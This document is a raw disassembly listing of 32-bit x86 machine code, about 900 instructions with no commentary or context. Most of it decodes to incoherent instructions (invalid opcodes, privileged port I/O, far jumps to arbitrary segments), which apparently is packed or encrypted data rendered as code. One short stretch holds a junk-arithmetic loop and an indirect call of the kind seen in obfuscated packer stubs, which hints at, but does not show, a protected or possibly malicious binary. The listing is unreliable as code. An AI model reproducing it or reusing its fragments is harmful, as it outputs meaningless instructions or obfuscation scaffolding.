  4028ca:	(bad)  
  4028cb:	sti    
  4028cc:	mov    cl,0x62
  4028ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028cf:	pusha  
  4028d0:	scas   eax,DWORD PTR es:[edi]
  4028d1:	loop   0x4028e5
  4028d3:	push   0xffffffd8
  4028d5:	jp     0x402924
  4028d7:	ja     0x40288c
  4028d9:	sbb    ecx,eax
  4028db:	or     al,0x9c
  4028dd:	xchg   edi,eax
  4028de:	mov    esi,0xa818a0f7
  4028e3:	jb     0x402894
  4028e5:	xchg   edx,eax
  4028e6:	xor    BYTE PTR [edi+0x6f],0xe
  4028ea:	ins    BYTE PTR es:[edi],dx
  4028eb:	sti    
  4028ec:	fisttp DWORD PTR [eax+0x2aa6c976]
  4028f2:	leave  
  4028f3:	mov    dl,0x68
  4028f5:	pop    ebp
  4028f6:	inc    esi
  4028f7:	dec    ebp
  4028f8:	sbb    bh,BYTE PTR [edi+esi*4+0x580d4317]
  4028ff:	aas    
  402900:	retf   
  402901:	jmp    0x1e13:0xd96e4fd6
  402908:	shl    bh,1
  40290a:	mov    dl,0x98
  40290c:	adc    al,0xc8
  40290e:	fdiv   QWORD PTR [eax]
  402910:	cli    
  402911:	(bad)  
  402912:	out    dx,al
  402913:	cmp    dh,bl
  402915:	fucomip st,st(4)
  402918:	xchg   edi,eax
  402919:	dec    ebx
  40291a:	aam    0xdf
  40291c:	mov    ds,WORD PTR [esp+0x6]
  402920:	mov    ebx,0xdd00ab97
  402925:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402927:	mov    esi,0xae87374d
  40292c:	jecxz  0x40290e
  40292e:	scas   al,BYTE PTR es:[edi]
  40292f:	mov    eax,0xe603767d
  402934:	dec    edx
  402935:	add    eax,0xb03bcdec
  40293a:	aam    0x62
  40293c:	and    BYTE PTR ds:[ebx],al
  40293f:	loop   0x4029be
  402941:	sar    DWORD PTR [ecx+eiz*1+0x3b2302ce],0xfa
  402949:	mov    DWORD PTR ds:0x434392,0x545f
  402953:	je     0x40391f
  402959:	and    edx,edx
  40295b:	mov    edx,DWORD PTR [ebp-0x8]
  40295e:	sbb    DWORD PTR ds:0x432dde,0x186f
  402968:	mov    eax,DWORD PTR [ebp-0x4]
  40296b:	xor    eax,ecx
  40296d:	and    DWORD PTR ds:0x43439e,0x0
  402977:	jmp    0x402989
  40297c:	mov    edi,DWORD PTR ds:0x43439e
  402982:	inc    edi
  402983:	mov    DWORD PTR ds:0x43439e,edi
  402989:	cmp    DWORD PTR ds:0x43439e,0x10
  402990:	jae    0x4029c8
  402996:	cmp    DWORD PTR ds:0x43439e,0x14
  40299d:	jne    0x4029c3
  4029a3:	push   DWORD PTR [ebp-0x18]
  4029a6:	push   0x43437e
  4029ab:	push   0x4692
  4029b0:	push   0x432738
  4029b5:	push   DWORD PTR [ebp-0x14]
  4029b8:	push   0x4d96
  4029bd:	call   DWORD PTR ds:0x432cea
  4029c3:	jmp    0x40297c
  4029c8:	mov    edi,0xffcd8d64
  4029cd:	sub    edi,eax
  4029cf:	add    edi,DWORD PTR [ebp+0x10]
  4029d2:	xor    edx,ecx
  4029d4:	adc    DWORD PTR ds:0x432de6,0x432dbe
  4029de:	add    edx,esi
  4029e0:	mov    DWORD PTR ds:0x43436a,0x3472
  4029ea:	cmp    edx,edi
  4029ec:	ja     0x40391a
  4029f2:	push   ebx
  4029f3:	jmp    0x4029fd
  4029f8:	mov    esi,0x32729c
  4029fd:	mov    eax,DWORD PTR [ebp-0x8]
  402a00:	jmp    0x402db6
  402a05:	mov    eax,ds:0x61e6e778
  402a0a:	in     eax,0xa1
  402a0c:	inc    ebx
  402a0d:	sub    BYTE PTR [edi-0xbc4ee04],ah
  402a13:	cmp    al,BYTE PTR [ecx]
  402a15:	add    BYTE PTR [eax+esi*2],cl
  402a18:	jo     0x4029b1
  402a1a:	jge    0x402a8c
  402a1c:	jo     0x402a1c
  402a1e:	repz fistp DWORD PTR [edx-0x22]
  402a22:	into   
  402a23:	es adc edx,ebx
  402a26:	fimul  WORD PTR [ebp+0x1b]
  402a29:	push   ebx
  402a2a:	icebp  
  402a2b:	test   bh,ch
  402a2d:	ja     0x4029d9
  402a2f:	cs cld 
  402a31:	cmp    eax,0x18ae90b6
  402a36:	test   eax,0xcf4a27db
  402a3b:	mov    ?,WORD PTR [eax-0x6095a763]
  402a41:	jmp    FWORD PTR [edi+0x7dbf18b6]
  402a47:	push   eax
  402a48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a49:	push   cs
  402a4a:	cmp    DWORD PTR [eax-0x578ff007],ebp
  402a50:	add    al,0xdc
  402a52:	inc    ecx
  402a53:	mov    ds:0xdd416005,al
  402a58:	pop    ebp
  402a59:	in     eax,dx
  402a5a:	iret   
  402a5b:	sbb    cl,BYTE PTR [ebx+0x69caa7b2]
  402a61:	(bad)  
  402a62:	std    
  402a63:	inc    esp
  402a64:	jg     0x402a5a
  402a66:	ja     0x402aa7
  402a68:	pop    ebx
  402a69:	cs stc 
  402a6b:	fst    QWORD PTR [ecx+edx*8]
  402a6e:	xchg   edx,eax
  402a6f:	fdiv   st,st(7)
  402a71:	mov    BYTE PTR es:[ecx+0x3dc1c95f],dh
  402a78:	push   ebx
  402a79:	dec    edi
  402a7a:	shr    BYTE PTR [esi-0x63],cl
  402a7d:	adc    al,0xf
  402a7f:	dec    esi
  402a80:	mov    dl,ah
  402a82:	xor    DWORD PTR [ebp-0x532c24fd],0x6de20f9d
  402a8c:	lds    esp,FWORD PTR [esi+0x4236a20f]
  402a92:	mov    al,ds:0x2bf508b1
  402a97:	div    BYTE PTR [ebx]
  402a99:	enter  0x90a8,0x11
  402a9d:	inc    eax
  402a9e:	fisub  DWORD PTR [eax+0xf]
  402aa1:	cmp    al,0x3a
  402aa3:	sub    DWORD PTR [edx-0x50],esi
  402aa6:	mov    ebp,0xbc4b0ccf
  402aab:	mov    ss,WORD PTR [ecx]
  402aad:	sti    
  402aae:	xor    eax,0x9dec8d7d
  402ab3:	and    eax,0x6a36196d
  402ab8:	sbb    dh,dl
  402aba:	mov    eax,DWORD PTR ds:0x1e3deb82
  402ac0:	mov    al,0xe2
  402ac2:	daa    
  402ac3:	xor    esi,DWORD PTR [ebx]
  402ac5:	mov    esi,0x12e55298
  402aca:	adc    eax,0xabdea38e
  402acf:	(bad)  [edx]
  402ad1:	or     DWORD PTR [ecx+0x52c2b698],edi
  402ad7:	in     al,0x33
  402ad9:	cmp    eax,DWORD PTR [esi-0x7c]
  402adc:	(bad)  
  402add:	int    0xec
  402adf:	(bad)
  402ae3:	ins    DWORD PTR es:[edi],dx
  402ae4:	sub    ecx,DWORD PTR [ebx+0x29]
  402ae7:	test   eax,0x531993c9
  402aec:	in     al,dx
  402aed:	rol    BYTE PTR [ecx+0x48],0x74
  402af1:	in     eax,dx
  402af2:	xor    DWORD PTR [ecx-0x27],ecx
  402af5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402af6:	mov    eax,0x9870affb
  402afb:	or     DWORD PTR [edx-0x19059516],eax
  402b01:	dec    edi
  402b02:	stos   DWORD PTR es:[edi],eax
  402b03:	push   eax
  402b04:	int    0xd7
  402b06:	xchg   ebx,eax
  402b07:	jl     0x402b11
  402b09:	mov    dl,0xab
  402b0b:	fist   WORD PTR [edx]
  402b0d:	shr    BYTE PTR [edi+0x5],1
  402b10:	mov    esi,0x43d78988
  402b15:	mov    bh,0x5b
  402b17:	push   es
  402b18:	pusha  
  402b19:	mov    ds:0x2fa45687,eax
  402b1e:	into   
  402b1f:	jmp    0x402af8
  402b21:	cwde   
  402b22:	xchg   edx,eax
  402b23:	inc    esp
  402b24:	add    BYTE PTR [ebp+0x7070b6b8],dh
  402b2a:	jnp    0x402b56
  402b2c:	push   eax
  402b2d:	test   al,0x91
  402b2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b30:	loopne 0x402ac2
  402b32:	fimul  WORD PTR [ebp-0x7d3f353a]
  402b38:	pop    esi
  402b39:	mul    BYTE PTR ds:0x2b3807ab
  402b3f:	add    eax,DWORD PTR [edi]
  402b41:	push   DWORD PTR [ecx]
  402b43:	push   ebx
  402b44:	mov    dl,0x47
  402b46:	adc    eax,DWORD PTR [ecx-0x48]
  402b49:	imul   esi,ecx,0xfb147638
  402b4f:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  402b51:	or     ah,BYTE PTR [ebx-0x4c]
  402b54:	inc    ebp
  402b55:	outs   dx,DWORD PTR ds:[esi]
  402b56:	std    
  402b57:	xlat   BYTE PTR ds:[ebx]
  402b58:	mov    ds:0x3a23cfbf,al
  402b5d:	jbe    0x402bca
  402b5f:	push   ebx
  402b60:	repz dec edi
  402b62:	xchg   esi,eax
  402b63:	dec    eax
  402b64:	and    BYTE PTR [esi],0x75
  402b67:	inc    ecx
  402b68:	mov    ecx,0x811298e4
  402b6d:	aad    0x27
  402b6f:	enter  0xffaf,0x28
  402b73:	repnz adc eax,DWORD PTR ds:[esi+0x3f]
  402b78:	sbb    al,0x96
  402b7a:	inc    ebp
  402b7b:	mov    ds,edi
  402b7d:	into   
  402b7e:	inc    ebx
  402b7f:	aas    
  402b80:	jp     0x402b7a
  402b82:	sbb    ebp,DWORD PTR [edi-0x7e]
  402b85:	fnstsw WORD PTR ds:0x29b6887e
  402b8b:	push   ecx
  402b8c:	(bad)  
  402b8e:	sub    dl,BYTE PTR [ebx-0x2a]
  402b91:	mov    edi,0xcbbf7ba9
  402b96:	lds    edx,FWORD PTR [ebp+0x3c]
  402b99:	icebp  
  402b9a:	fistp  DWORD PTR [edi+0x4c0317f4]
  402ba0:	add    BYTE PTR [eax+ebx*2],bh
  402ba3:	adc    esp,esp
  402ba5:	adc    al,0x9a
  402ba7:	ficomp DWORD PTR [eax-0x51]
  402baa:	xor    DWORD PTR [edi+edx*8-0x3f994799],esi
  402bb1:	leave  
  402bb2:	jae    0x402b52
  402bb4:	ins    DWORD PTR es:[edi],dx
  402bb5:	xchg   ecx,edx
  402bb7:	jmp    0xaac8:0x2ea3f1e0
  402bbe:	mov    eax,ds:0xe2ff9a9d
  402bc3:	dec    ecx
  402bc4:	ins    BYTE PTR es:[edi],dx
  402bc5:	jb     0x402bc5
  402bc7:	outs   dx,DWORD PTR ds:[esi]
  402bc8:	enter  0x786a,0x64
  402bcc:	pop    esi
  402bcd:	sub    ah,BYTE PTR [edx-0x20fa7d65]
  402bd3:	jne    0x402bde
  402bd5:	pop    esp
  402bd6:	xor    BYTE PTR [eax],0xf3
  402bd9:	push   eax
  402bda:	cli    
  402bdb:	pop    ebx
  402bdc:	jle    0x50af7839
  402be2:	push   edi
  402be3:	pop    edi
  402be4:	mov    cl,0x28
  402be6:	cdq    
  402be7:	icebp  
  402be8:	stos   DWORD PTR es:[edi],eax
  402be9:	or     ah,BYTE PTR [ecx]
  402beb:	xchg   BYTE PTR [esi-0x55165b7a],cl
  402bf1:	push   es
  402bf2:	jge    0x402b78
  402bf4:	cmp    bl,bh
  402bf6:	jo     0x402c4c
  402bf8:	xlat   BYTE PTR ds:[ebx]
  402bf9:	test   al,0x4e
  402bfb:	sub    edx,DWORD PTR [edi]
  402bfd:	stos   DWORD PTR es:[edi],eax
  402bfe:	into   
  402bff:	push   esp
  402c00:	fadd   DWORD PTR [ecx]
  402c02:	and    BYTE PTR [ecx-0x5a291766],bl
  402c08:	ret    
  402c09:	mov    dh,0x98
  402c0b:	nop    DWORD PTR [edi]
  402c0e:	mov    ah,0xb4
  402c10:	jmp    0xafe907a6
  402c15:	jecxz  0x402c39
  402c17:	mov    BYTE PTR [esp+esi*4],bl
  402c1a:	lods   eax,DWORD PTR ds:[esi]
  402c1b:	ds xor eax,0xd51c96c2
  402c21:	icebp  
  402c22:	and    eax,0xa0407b36
  402c27:	mov    eax,ds:0x2a66c581
  402c2c:	add    al,0xda
  402c2e:	cmp    dl,bl
  402c30:	mov    gs,WORD PTR [edx]
  402c32:	adc    al,0x8f
  402c34:	js     0x402c3c
  402c36:	lods   eax,DWORD PTR ds:[esi]
  402c37:	in     al,dx
  402c38:	jmp    0x402bf7
  402c3a:	repnz lods eax,DWORD PTR ds:[esi]
  402c3c:	test   eax,0x2bf903fa
  402c41:	or     BYTE PTR [ebp+0x46748035],0xf5
  402c48:	retf   0xabc1
  402c4b:	mov    WORD PTR [ecx-0x63267de9],es
  402c51:	repnz inc esi
  402c53:	fdivr  QWORD PTR [esi+0x0]
  402c56:	mov    al,ds:0x9162208e
  402c5b:	sub    DWORD PTR [esi+0x1ff988ce],eax
  402c61:	je     0x402cb5
  402c63:	sub    ah,ch
  402c65:	lods   al,BYTE PTR ds:[esi]
  402c66:	or     eax,0xdeba8b
  402c6b:	or     al,0x5c
  402c6d:	push   ss
  402c6e:	repz shr ebp,cl
  402c71:	fs push ss
  402c73:	out    dx,al
  402c74:	or     edx,DWORD PTR [ebp+0x30]
  402c77:	ret    0x74e4
  402c7a:	inc    esi
  402c7b:	aad    0xbe
  402c7d:	inc    esi
  402c7e:	push   ebp
  402c7f:	inc    edi
  402c80:	sub    al,BYTE PTR [edi+0x39ea94b2]
  402c86:	and    DWORD PTR ds:0x5126b262,esp
  402c8c:	aad    0x27
  402c8e:	lods   eax,DWORD PTR ds:[esi]
  402c8f:	mov    dh,0xe2
  402c91:	out    0xb6,al
  402c93:	fisubr DWORD PTR [esi+esi*8-0x5c0c50d9]
  402c9a:	scas   eax,DWORD PTR es:[edi]
  402c9b:	mov    al,0x76
  402c9d:	push   eax
  402c9e:	sahf   
  402c9f:	dec    ebx
  402ca0:	ins    DWORD PTR es:[di],dx
  402ca2:	(bad)  
  402ca3:	jg     0x402c9a
  402ca5:	jmp    0x8d0bacc3
  402caa:	sar    DWORD PTR [edi-0x52],1
  402cad:	ja     0x402c4c
  402caf:	cmc    
  402cb0:	fs icebp 
  402cb2:	cmp    BYTE PTR [eax+0x2b],bh
  402cb5:	or     ebx,DWORD PTR [esi]
  402cb7:	ret    
  402cb8:	icebp  
  402cb9:	loopne 0x402d29
  402cbb:	stc    
  402cbc:	or     al,bh
  402cbe:	stc    
  402cbf:	sbb    ebp,ecx
  402cc1:	jg     0x402cb5
  402cc3:	xchg   ebx,eax
  402cc4:	cmp    ch,BYTE PTR [edx+0xb]
  402cc7:	cld    
  402cc8:	rcl    al,0x6e
  402ccb:	dec    esi
  402ccc:	les    esi,FWORD PTR [edx+0x69]
  402ccf:	dec    esp
  402cd0:	sub    al,0xae
  402cd2:	mov    ds:0x3686f07e,al
  402cd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402cd8:	add    esi,ebp
  402cda:	mov    ecx,0x98581edf
  402cdf:	add    DWORD PTR [ecx],edi
  402ce1:	jb     0x402c86
  402ce3:	ret    
  402ce4:	inc    esi
  402ce5:	inc    esi
  402ce6:	jno    0x402ca8
  402ce8:	add    BYTE PTR [edi-0x41c45607],al
  402cee:	or     dl,BYTE PTR [ebp+ecx*1-0x7e35b857]
  402cf5:	ror    BYTE PTR [edi-0x5c],cl
  402cf8:	mov    bh,al
  402cfa:	dec    ecx
  402cfb:	mov    ds:0xcd8e66a7,eax
  402d00:	xchg   edx,eax
  402d01:	jle    0x402cb9
  402d03:	mov    dl,0xc8
  402d05:	clc    
  402d06:	lea    ebp,[ebp-0x3]
  402d09:	jge    0x402ccf
  402d0b:	dec    edi
  402d0c:	outs   dx,BYTE PTR ds:[esi]
  402d0d:	fimul  WORD PTR [ebx]
  402d0f:	in     eax,dx
  402d10:	adc    bh,al
  402d12:	sbb    dh,BYTE PTR [eax+ebp*4]
  402d15:	neg    ebx
  402d17:	push   cs
  402d18:	sbb    al,0xa8
  402d1a:	or     DWORD PTR [edx],edi
  402d1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d1d:	in     eax,dx
  402d1e:	and    esi,edi
  402d20:	xlat   BYTE PTR ds:[ebx]
  402d21:	push   ebx
  402d22:	xchg   ebx,eax
  402d23:	add    edx,edx
  402d25:	jle    0x402ccd
  402d27:	outs   dx,BYTE PTR ds:[esi]
  402d28:	pop    ss
  402d29:	or     DWORD PTR [edi+edx*8],ebp
  402d2c:	das    
  402d2d:	cmc    
  402d2e:	xchg   esi,eax
  402d2f:	(bad)  
  402d30:	std    
  402d31:	push   edx
  402d32:	push   ss
  402d33:	xchg   ebp,eax
  402d34:	daa    
  402d35:	fwait
  402d36:	jbe    0x402d86
  402d38:	je     0x402d3a
  402d3a:	lea    edi,[ebx-0x29]
  402d3d:	repnz fstp TBYTE PTR [ebx-0x2c2e765d]
  402d44:	(bad)  
  402d45:	xchg   esi,eax
  402d46:	sti    
  402d47:	cmovne eax,esp
  402d4a:	gs add al,0x2e
  402d4d:	mov    edx,DWORD PTR [edx+ebp*1]
  402d50:	push   ds
  402d51:	aam    0xbb
  402d53:	mov    eax,0x1e274c00
  402d58:	or     eax,0x7b8e40b3
  402d5d:	sub    ebx,ebp
  402d5f:	enter  0x2a25,0x3c
  402d63:	add    eax,edx
  402d65:	mov    eax,ds:0x3afb93fd
  402d6a:	push   cs
  402d6b:	sbb    bh,ch
  402d6d:	xlat   BYTE PTR ds:[ebx]
  402d6e:	xchg   BYTE PTR [ebp-0x2b],bh
  402d71:	shl    BYTE PTR [ebp-0x75],cl
  402d74:	scas   al,BYTE PTR es:[edi]
  402d75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d76:	dec    esp
  402d77:	and    DWORD PTR [edx],edx
  402d79:	inc    edx
  402d7a:	pusha  
  402d7b:	jo     0x402da7
  402d7d:	pop    ecx
  402d7e:	push   esi
  402d7f:	sti    
  402d80:	or     dh,BYTE PTR [edi]
  402d82:	sbb    eax,0x62a60317
  402d87:	cmp    DWORD PTR [esi],0x53
  402d8a:	cli    
  402d8b:	inc    esi
  402d8c:	nop    DWORD PTR [edx-0x17]
  402d90:	int    0xa6
  402d92:	(bad)  
  402d93:	int    0x84
  402d95:	fld    DWORD PTR [eax]
  402d97:	fs daa 
  402d99:	les    esi,FWORD PTR [esi+0x75e8c448]
  402d9f:	pop    ecx
  402da0:	es hlt 
  402da2:	cdq    
  402da3:	cmp    esp,DWORD PTR [ecx+0x6a]
  402da6:	jge    0x402d5f
  402da8:	cmp    BYTE PTR [ebx+0xe5f081],ch
  402dae:	xor    eax,0x93ae94a1
  402db3:	push   0x7d8b0eef
  402db8:	cld    
  402db9:	jmp    0x40316f
  402dbe:	cs out dx,eax
  402dc0:	loopne 0x402e3e
  402dc2:	in     eax,dx
  402dc3:	jnp    0x402daf
  402dc5:	jmp    0x3c56257c
  402dca:	pop    esp
  402dcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402dcc:	mov    dl,0x7e
  402dce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402dcf:	or     DWORD PTR [eax+0x70],esi
  402dd2:	xchg   edi,eax
  402dd3:	jge    0x402e45
  402dd5:	jo     0x402dd3
  402dd7:	test   dh,cl
  402dd9:	shl    DWORD PTR [ebx+0x15cb50b3],0x2e
  402de0:	or     al,0x43
  402de2:	retf   0xd760
  402de5:	gs jg  0x402e38
  402de8:	jge    0x402de8
  402dea:	mov    ecx,0xca8d2fa7
  402def:	xor    eax,0x5c4691b5
  402df4:	loope  0x402df2
  402df6:	cmp    eax,0xa54a56f0
  402dfb:	bnd je 0x402e74
  402dfe:	stos   DWORD PTR es:[edi],eax
  402dff:	dec    eax
  402e00:	fadd   st,st(7)
  402e02:	cmp    DWORD PTR [ebp+0x51f28d3c],edi
  402e08:	inc    edx
  402e09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e0a:	fmul   QWORD PTR [eax-0xd]
  402e0d:	add    al,0xfb
  402e0f:	mov    DWORD PTR [ebx-0x7b617a75],esi
  402e15:	test   eax,0x9c1e6c83
  402e1a:	dec    ebx
  402e1b:	nop
  402e1c:	mov    bl,0xff
  402e1e:	out    0x23,al
  402e20:	xchg   DWORD PTR [esi+ecx*8-0x64],ebp
  402e24:	sbb    eax,0xcf96f039
  402e29:	sbb    DWORD PTR [esp+eiz*8],ecx
  402e2c:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  402e2e:	jl     0x402e61
  402e30:	and    ch,cl
  402e32:	adc    BYTE PTR [edi-0x17],al
  402e35:	or     bh,BYTE PTR [ecx-0x4288f230]
  402e3b:	xchg   esp,eax
  402e3c:	xchg   edx,eax
  402e3d:	test   al,0xa6
  402e3f:	and    ebx,DWORD PTR [eax]
  402e41:	and    ch,ah
  402e43:	pop    es
  402e44:	cmp    BYTE PTR [eax],ah
  402e46:	sbb    DWORD PTR [edx-0x26],edi
  402e49:	enter  0xf81b,0x6f
  402e4d:	mov    WORD PTR [ebx-0x7a],es
  402e50:	(bad)  
  402e51:	ins    BYTE PTR es:[edi],dx
  402e52:	fwait
  402e53:	push   ebp
  402e54:	inc    esp
  402e55:	ret    0x6cc8
  402e58:	jmp    0x585e:0x2a77d101
  402e5f:	sub    al,0x9c
  402e61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e62:	sbb    DWORD PTR [edx+0x177b0],esp
  402e68:	adc    ch,BYTE PTR [ebx+0x65]
  402e6b:	pop    esi
  402e6c:	pop    ds
  402e6d:	mov    ?,WORD PTR [eax+edx*1-0x4ac17f]
  402e74:	out    0x3a,al
  402e76:	add    edi,edi
  402e78:	pop    ebx
  402e79:	mov    BYTE PTR [edx-0x2],dh
  402e7c:	pusha  
  402e7d:	adc    eax,0x2cc4871a
  402e82:	into   
  402e83:	jo     0x402e53
  402e85:	inc    edx
  402e86:	fsubr  QWORD PTR [ecx]
  402e88:	popf   
  402e89:	scas   eax,DWORD PTR es:[edi]
  402e8a:	out    dx,eax
  402e8b:	fistp  QWORD PTR [esi+0x25]
  402e8e:	inc    edx
  402e8f:	inc    esp
  402e90:	scas   eax,DWORD PTR es:[edi]
  402e91:	out    dx,al
  402e92:	sbb    eax,DWORD PTR [ecx+0x41]
  402e95:	rcl    BYTE PTR [ebx],1
  402e97:	out    dx,al
  402e98:	cld    
  402e99:	jl     0x402f06
  402e9b:	or     al,0xd2
  402e9d:	add    ebx,DWORD PTR [esp+esi*4]
  402ea0:	push   ss
  402ea1:	or     al,0x1f
  402ea3:	and    dh,ch
  402ea5:	jp     0x402e69
  402ea7:	ret    
  402ea8:	je     0x402e96
  402eaa:	hlt    
  402eab:	inc    ecx
  402eac:	retf   
  402ead:	sub    al,0x73
  402eaf:	dec    ecx
  402eb0:	inc    esp
  402eb1:	shl    BYTE PTR [ebx-0x22769ad],0x19
  402eb8:	(bad)  
  402eb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402eba:	xor    ecx,0x3391d72f
  402ec0:	mov    eax,0xa3e02694
  402ec5:	repnz inc esi
  402ec7:	pop    esi
  402ec8:	hlt    
  402ec9:	jg     0x402f13
  402ecb:	scas   al,BYTE PTR es:[edi]
  402ecc:	jge    0x402f3a
  402ece:	aas    
  402ecf:	push   ebx
  402ed0:	fsubr  DWORD PTR [ebx+0x1b915503]
  402ed6:	dec    edx
  402ed7:	or     edx,DWORD PTR [edi+eiz*2+0x22]
  402edb:	shr    bh,1
  402edd:	out    dx,al
  402ede:	sbb    BYTE PTR [ecx-0x57dcbf45],ch
  402ee4:	sti    
  402ee5:	mov    bl,0x28
  402ee7:	ret    
  402ee8:	inc    ebx
  402ee9:	mov    ebx,0xc8711482
  402eee:	(bad)  
  402eef:	dec    esi
  402ef0:	test   al,0x32
  402ef2:	int    0x1f
  402ef4:	in     al,dx
  402ef5:	ins    BYTE PTR es:[edi],dx
  402ef6:	js     0x402f76
  402ef8:	arpl   WORD PTR gs:[ecx+0x10ef5bd2],bx
  402eff:	jb     0x402f75
  402f01:	fnsave [esp+edx*2-0x396dd280]
  402f08:	adc    BYTE PTR [edx+ebx*2-0x25af740f],0xd0
  402f10:	dec    edx
  402f11:	cdq    
  402f12:	cmp    esi,DWORD PTR [edx-0x4]
  402f15:	cwde   
  402f16:	sub    ecx,DWORD PTR [ebx]
  402f18:	sti    
  402f19:	in     eax,dx
  402f1a:	lea    ebp,[ebx]
  402f1c:	ins    DWORD PTR es:[edi],dx
  402f1d:	cmp    DWORD PTR [ecx+eiz*8],ecx
  402f20:	mov    bh,0xbd
  402f22:	gs jecxz 0x402f62
  402f25:	push   ecx
  402f26:	adc    eax,DWORD PTR [ecx+0x630800cb]
  402f2c:	jge    0x402f66
  402f2e:	stc    
  402f2f:	out    0xa9,eax
  402f31:	inc    ecx
  402f32:	jp     0x402f4a
  402f34:	sahf   
  402f35:	jmp    0xcd6a:0x6044b973
  402f3c:	mov    BYTE PTR [edx+edx*4-0x48],bl
  402f40:	dec    esp
  402f41:	in     eax,0x8a
  402f43:	sti    
  402f44:	int    0xfc
  402f46:	les    edi,FWORD PTR [eax+ebp*2+0x5b81940d]
  402f4d:	or     bh,ah
  402f4f:	cmc    
  402f50:	cmp    DWORD PTR [eax],edi
  402f52:	(bad)  
  402f53:	cld    
  402f54:	loop   0x402fc1
  402f56:	out    dx,al
  402f57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f58:	fidiv  DWORD PTR [esi-0x10]
  402f5b:	out    0x74,al
  402f5d:	mov    ebx,0xf3e173aa
  402f62:	(bad)  
  402f63:	enter  0x972a,0x16
  402f67:	in     eax,dx
  402f68:	fdiv   DWORD PTR [ecx-0x4f976605]
  402f6e:	lock and DWORD PTR [ebp+eax*8-0x1b],eax
  402f73:	imul   DWORD PTR [esi+edx*1+0x5134074f]
  402f7a:	inc    DWORD PTR ds:0x42923aa0
  402f80:	retf   
  402f81:	js     0x402f1d
  402f83:	inc    ebp
  402f84:	stos   DWORD PTR es:[edi],eax
  402f85:	jae    0x402f71
  402f87:	ss dec ebx
  402f89:	cdq    
  402f8a:	(bad)  
  402f8d:	push   cs
  402f8e:	pop    edi
  402f8f:	mov    ds:0x6e77f12a,al
  402f94:	int    0x91
  402f96:	mov    fs,esp
  402f98:	push   esp
  402f99:	and    al,BYTE PTR [ebx]
  402f9b:	push   ss
  402f9c:	repnz enter 0x36bf,0xb6
  402fa1:	cli    
  402fa2:	les    edx,FWORD PTR [edi]
  402fa4:	cmc    
  402fa5:	xchg   ebp,eax
  402fa6:	inc    esp
  402fa7:	imul   ecx,edi,0xfffffff7
  402faa:	out    dx,eax
  402fab:	bnd jmp 0x403011
  402fae:	sub    ah,cl
  402fb0:	into   
  402fb1:	xchg   edi,eax
  402fb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fb3:	fld    TBYTE PTR [eax+0x75e00e8b]
  402fb9:	popf   
  402fba:	mov    eax,ds:0x12870289
  402fbf:	cwde   
  402fc0:	inc    esi
  402fc1:	jae    0x403038
  402fc3:	(bad)  
  402fc4:	aaa    
  402fc5:	pop    esp
  402fc6:	popf   
  402fc7:	jge    0x402fd3
  402fc9:	sbb    ebp,ebx
  402fcb:	pop    ecx
  402fcc:	cmp    BYTE PTR [eax-0x56],ah
  402fcf:	imul   edx,DWORD PTR [eax],0xffffffc9
  402fd2:	push   esi
  402fd3:	jno    0x403043
  402fd5:	je     0x402fe4
  402fd7:	into   
  402fd8:	(bad)  
  402fd9:	push   ds
  402fda:	pop    ecx
  402fdb:	stos   DWORD PTR es:[edi],eax
  402fdc:	fnstcw WORD PTR [ebx]
  402fde:	dec    eax
  402fdf:	xor    eax,0x62122310
  402fe4:	adc    eax,0x6d40c0bd
  402fe9:	or     al,0xb9
  402feb:	add    ch,ah
  402fed:	and    ecx,DWORD PTR [eax+0x2e]
  402ff0:	fcom   DWORD PTR [edx]
  402ff2:	test   BYTE PTR [edx+0x46c229b5],cl
  402ff8:	jl     0x403062
  402ffa:	mov    esi,eax
  402ffc:	loope  0x403043
  402ffe:	dec    ch
  403000:	xor    edx,edi
  403002:	cmp    ebp,DWORD PTR [ebx]
  403004:	(bad)  
  403005:	sub    al,0xf4
  403007:	mov    ah,0xc1
  403009:	sbb    al,0xbd
  40300b:	mov    eax,DWORD PTR ds:0x6a18a631
  403011:	into   
  403012:	stc    
  403013:	mov    cl,0xa9
  403015:	sahf   
  403016:	adc    esi,DWORD PTR [esi-0x47]
  403019:	inc    ebp
  40301a:	mov    ds:0x1fcad67e,al
  40301f:	pop    eax
  403020:	pop    ds
  403021:	popf   
  403022:	jae    0x40300f
  403024:	test   bl,0x63
  403027:	inc    eax
  403028:	loop   0x402fdd
  40302a:	jno    0x40302c
  40302c:	or     al,0xed
  40302e:	pop    es
  40302f:	dec    esp
  403030:	rcr    ah,0x83
  403033:	cmc    
  403034:	xor    dh,BYTE PTR [edx-0x6040ea52]
  40303a:	push   esi
  40303b:	sub    ah,al
  40303d:	adc    BYTE PTR [edi+0x34b9b56d],ch
  403043:	inc    ecx
  403044:	cdq    
  403045:	popf   
  403046:	clc    
  403047:	retf   0x85c2
  40304a:	jne    0x403061
  40304c:	jne    0x40306f
  40304e:	dec    DWORD PTR [eax-0x4f]
  403051:	out    0xfb,al
  403053:	and    DWORD PTR [ebx],ebp
  403055:	push   0xb7bab47d
  40305a:	sub    al,0xe5
  40305c:	es in  eax,dx
  40305e:	add    eax,0x46baa315
  403063:	fstp   DWORD PTR [esi]
  403065:	outs   dx,BYTE PTR ds:[esi]
  403066:	jne    0x4030ab
  403068:	dec    ebp
  403069:	aas    
  40306a:	rcl    edx,1
  40306c:	mov    al,0xa6
  40306e:	push   esp
  40306f:	int3   
  403070:	add    esp,ebp
  403072:	sub    BYTE PTR [esi],al
  403074:	mov    ch,0xf6
  403076:	sbb    edi,DWORD PTR [esi+0x5b]
  403079:	pusha  
